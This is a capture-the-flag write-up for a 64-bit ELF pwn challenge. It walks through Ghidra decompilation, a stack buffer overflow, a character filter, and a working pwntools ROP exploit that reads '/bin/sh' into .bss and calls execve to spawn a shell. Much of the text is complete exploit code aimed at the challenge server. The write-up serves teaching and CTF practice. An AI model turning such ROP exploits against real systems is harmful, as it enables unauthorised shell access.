# warm-up (pwn 100 pts)
> aight! let's do a quick warm up game.

> `nc 45.130.164.173 2233`

---

## What we're given
We're given a 64-bit ELF binary that's presumably running on the challenge server.
When running it locally, it just prompts us for a string, chides us if it contains an "evil char" and then exits.

## What's inside?
Opening the binary up in Ghidra, we see the following `main()` function.
```C
undefined8 main(void)
{
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  puts("welcome players! enjoy your warmup game.");
  vuln();
  puts("hope that went well!");
  return 0;
}
```
And `vuln()` looks like this.
```C
undefined8 vuln(void)
{
  char local_88 [111];
  char local_19;
  ssize_t local_18;
  long local_10;
  
  memset(local_88,0,100);
  puts("aight ! now show me what u got.");
  local_18 = read(0,local_88,0x120);
  if (local_18 < 1) {
    exit(1);
  }
  local_10 = 0;
  while( true ) {
    if (local_18 <= local_10) {
      return 0;
    }
    local_19 = local_88[local_10];
    if ((((local_19 == '/') || (local_19 == 's')) || (local_19 == 'a')) || (local_19 == 't')) break;
    local_10 = local_10 + 1;
  }
  printf("evil char detected \'%c\'\n",(ulong)(uint)(int)local_19);
  exit(1);
}
```
The first thing that jumps out at us here is that the program reads in `0x120 = 288` bytes into the `111` byte array `local_88` (this isn't entirely correct, but we'll clarify in a bit).
After poking around the binary, there don't appear to be any other interesting functions that construct the flag, so at this point, we suspect that we're supposed to spawn a shell using some kind of stack-smashing exploit. 


---
## Ruling out basic stack-smashing
In order to overwrite the return address and get a stack-smashing exploit going, we need to know how far the end of our buffer (`local_88`) is from the return address.
In the disassembly of `vuln()`, Ghidra has a comment indicating that `local_88` is at `Stack[-0x88]` (hence the name), and the instruction `lea rax, [rbp - 0x80]` confirms this.
Indeed, the stack layout looks something like 
```
[ saved return address ]
[ saved RBP            ]  
[ ... other locals ... ]  \ distance of 0x80 bytes
[ local_88             ]  /
```
Since the RBP itself is 8 bytes, the return address is `0x80 + 0x08 = 0x88 = 136` bytes from the start of the buffer `local_88`.
We're `read()`-ing 288 bytes, so we have `288 - 136 = 152` bytes of actual payload to work with.
One thing worth noting is that the decomp showing `local_88` as having a size of 111 bytes is, as far as I can tell, a _guess_ on Ghidra's part.
Regardless, it is _at most_ `0x80` bytes (since there could be other locals between the buffer and the saved RBP) and we're `read()`-ing 288 bytes, so we have a potential buffer overflow either way.
We could just write shellcode onto the stack, but `checksec` shows that NX is enabled, so the stack is marked as No eXecute and we'll need to take a return-oriented programming ([ROP](https://en.wikipedia.org/wiki/Return-oriented_programming)) approach and reuse the binary's existing executable code.

One thing worth noting is that `vuln()` has no stack canary, so this plan of attack should work in principle.

---
## Setting up the ROP chain
We want to spawn a shell with something like `execve("/bin/sh", 0, 0)`, but even if our payload could get `syscall` us into `execve()`, the string `"/bin/sh"` contains the forbidden characters `s` and `/`.
We would then need to find a copy of `"/bin/sh"` somewhere in the binary itself and our exploit would look something like this.
```Python
from pwn import *

context.binary = elf = ELF('./warm_up')   # arch=amd64, no-PIE expected (confirm with checksec)

BAD = set(b'/sat')   # 0x2f 0x73 0x61 0x74
def clean(b):
    assert not (set(b) & BAD), f"filtered byte in {b!r}"
    return b

bss = 0x4c72b0

rop = ROP(elf)

# want to call execve("/bin/sh", 0, 0) via syscall(0x3b), since 0x3b is the call number for execve, so we need
# [rax] = 0x3b
# [rdi] = "/bin/sh\x00" (remember null-termination!)
# [rsi] = 0
# [rdx] = 0
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]
binsh   = next(elf.search(b'/bin/sh\x00'))  # can't write this in ourselves

# need these addresses to be clean
for n, g in [('rdi', pop_rdi), ('rsi', pop_rsi), ('rdx', pop_rdx),
             ('rax', pop_rax), ('syscall', syscall)]:
    log.info(f"{n} = {g:#x}")
    clean(p64(g))

OFFSET = 136
payload  = b'A' * OFFSET
payload += p64(pop_rdi) + p64(binsh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(0x3b) # execve call number
payload += p64(syscall)

clean(payload)

assert len(payload) <= 152

io = process('./warm_up')
io.recvuntil(b'show me what u got.')
io.send(payload)
io.interactive()
```

A couple of issues with this.

1. pwntools couldn't find a `pop rdx; ret` gadget.
2. There's no string `"/bin/sh"` anywhere in the binary.

Issue 1 is pretty easily taken care of.
We can get by without the _exact_ gadget `pop rdx; ret`.
Gadgets like `pop rdx; pop rbx; ret` will also do just fine (since we don't care about the `rbx` register) and the [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) tool is smart enough to find gadgets like this.

```bash
┌──(liam-kali㉿liam-desktop24)-[~/CTF/2026/THEM/warmup]
└─$ ROPgadget --binary ./warm_up | grep -E ': pop rdx'
... (omitting some obviously useless ones)
0x0000000000405022 : pop rdx ; add dword ptr [rax], eax ; jmp 0x404a62
0x0000000000429a66 : pop rdx ; add eax, 0x83480000 ; ret 0x4910
0x000000000047a07b : pop rdx ; cli ; dec dword ptr [rax - 0x77] ; ret
0x000000000041b8b7 : pop rdx ; movups xmmword ptr [r10 + 0x18], xmm0 ; jmp 0x41b893
0x000000000046f8f9 : pop rdx ; or byte ptr [rax - 0x7d], cl ; ret 0x8d08
0x00000000004506c5 : pop rdx ; or byte ptr [rcx - 0xa], al ; ret
0x0000000000485d2b : pop rdx ; pop rbx ; ret
0x0000000000453da4 : pop rdx ; popfq ; add al, 0 ; jmp 0x453d35
0x00000000004221e9 : pop rdx ; xor eax, eax ; pop rbp ; pop r12 ; ret
```
Of these, the `pop rdx; pop rbx; ret` gadget at `0x485d2b` is the cleanest since it ends with `ret` and not `jmp`, doesn't mess with `rax` and doesn't have any potentially bad writes like `or byte ptr [rax - 0x7d]`.
We'll just drop this in wherever we want `pop rdx; ret`.


## The actual exploit
Issue 2 is a little more annoying.
We can't write `"/bin/sh"` into the `read()` ourselves since it has forbidden characters and there's no copy of the string in the binary for us to borrow.
Our evil plan: spawn another `read()` first and use _this_ `read()` to put `"/bin/sh"` somewhere other than `local_88`.
Since only `local_88` is checked for illegal characters, there's no issue putting `"/bin/sh"` somewhere else.
We'll place it somewhere that's unlikely to cause issues, like the `.bss` region, whose address we find with `readelf`.
```bash
┌──(liam-kali㉿liam-desktop24)-[~/CTF/2026/THEM/warmup]
└─$ readelf -S ./warm_up | grep -E '\.bss|\.data'
  [18] .data.rel.ro      PROGBITS         00000000004c17e0  000c07e0
  [21] .data             PROGBITS         00000000004c50e0  000c40e0
  [25] .bss              NOBITS           00000000004c72a0  000c6290
```
So `.bss` starts at `0x4c72a0`, but just to be safe, we add, e.g., `0x10`.
We're good since `b0 72 4c` (the address comes in little-endian) will be passed to the first `read()` that gets checked and it doesn't contain any bad characters.

Our final exploit is the following.
```Python
from pwn import *

context.binary = elf = ELF('./warm_up')   # arch=amd64, no-PIE expected (confirm with checksec)

BAD = set(b'/sat')   # 0x2f 0x73 0x61 0x74
def clean(b):
    assert not (set(b) & BAD), f"filtered byte in {b!r}"
    return b

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = 0x485d2b # found with ROPgadget
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]
read_fn = elf.symbols.get('read', 0)
bss = 0x4c72a0 + 0x10

for n, g in [('rdi', pop_rdi), ('rsi', pop_rsi), ('rdx', pop_rdx_rbx),
             ('rax', pop_rax), ('syscall', syscall)]:
    log.info(f"{n} = {g:#x}")
    clean(p64(g))

# want to read the 8 bytes "/bin/sh\x00" into .bss + 0x10
# then call execve(*(.bss + 0x10), 0, 0)
# [rax] = 0x3b
# [rdi] = "/bin/sh\x00" (remember null-termination!)
# [rsi] = 0
# [rdx] = 0

OFFSET = 136
payload  = b'A' * OFFSET
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx_rbx) + p64(8) + p64(0) 
payload += p64(read_fn)

payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)
payload += p64(pop_rax) + p64(0x3b) # execve call number
payload += p64(syscall)

clean(payload)

assert len(payload) <= 0x120

io = process('./warm_up')
# io = remote('45.130.164.173', 2233)
io.recvuntil(b'show me what u got.')
io.send(payload)
io.send(b'/bin/sh\x00')
io.interactive()
```